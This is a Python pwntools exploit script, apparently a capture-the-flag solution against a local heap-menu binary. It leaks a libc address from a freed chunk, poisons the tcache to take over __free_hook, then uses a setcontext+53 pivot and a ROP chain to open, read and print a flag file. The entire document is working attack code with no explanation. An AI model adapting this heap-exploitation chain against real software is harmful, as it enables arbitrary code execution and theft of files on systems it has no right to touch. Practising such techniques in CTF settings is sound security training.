from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


# gdb.attach(p)

# leak libc addr
add_chunk(0, 0x500)
add_chunk(1, 0x500)
add_chunk(2, 0x10)

delete_chunk(0)
show_chunk(0)
tmp = p.recvuntil((b"\x7f", b"\x7e"))[-6:].ljust(8, b"\x00")
print(tmp, hex(u64(tmp)))
libc.address = u64(tmp) - 0x3B6BE0
print("libc.address", hex(libc.address))

# tcache poisoning
add_chunk(0, 0x400)
add_chunk(1, 0x400)
delete_chunk(1)
delete_chunk(0)
edit_chunk(0, p64(libc.sym["__free_hook"]))

# get __free_hook
add_chunk(0, 0x400)
add_chunk(0, 0x400)

# --------construct payload--------
payload_addr = libc.sym["__free_hook"]
buf_addr = payload_addr + 0x100
frame_addr = buf_addr + 0x20

frame = SigreturnFrame() # setcontext frame, call open
frame.rsp = payload_addr + 8
frame.rip = libc.sym["open"]
frame.rdi = buf_addr
frame.rsi = 0

payload = b""
# __free_hook[0] = setcontext_gadget
payload += p64(
    next(
        libc.search(
            asm("mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;"),
            executable=True,
        )
    )
)
# rop_gadgets
payload += p64(next(libc.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(3)
payload += p64(next(libc.search(asm("pop rsi; ret;"), executable=True)))
payload += p64(buf_addr)
payload += p64(next(libc.search(asm("pop rdx; ret;"), executable=True)))
payload += p64(0x20)
payload += p64(libc.sym["read"])
payload += p64(next(libc.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(buf_addr)
payload += p64(libc.sym["puts"])
payload = payload.ljust(buf_addr - payload_addr, b"\x00")
payload += b"./flag\x00"
payload = payload.ljust(frame_addr - payload_addr, b"\x00")
payload += bytes(frame)
# --------construct payload end--------

# edit __free_hook
"""
&__free_hook                  rop start here                                                          (&setcontext+53)(frame)
    |                         |                                                                       |
    |----gadget (size:0x8)----|----rop chain (size:0x100)----|----buffer for read/puts (size:0x20)----|----frame for setcontext+53----|
"""
edit_chunk(0, payload)
edit_chunk(1, p64(libc.sym["setcontext"] + 53) + p64(frame_addr))

# call: __free_hook(setcontext_gadget) -> setcontext+53 -> rop_gadgets
delete_chunk(1)
print("[*] done...")

p.interactive()
